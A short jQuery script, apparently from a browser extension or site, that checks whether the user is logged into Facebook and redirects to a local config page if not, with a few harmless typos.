$(function(){
	if(window.location.pathname =="/HTML/config.html"){
	redrect = "https://facebook.com"
	$(".flop a").attr({"href":redrect})
	}
	else{
		$.ajax({ url: "https://www.facebook.com/login.php", 
method : "GET",
success: function(data){if(data.indexOf("login_page") >0){window.location.href = "/HTML/config.html?redrect"+window.location.href } } });
	}
})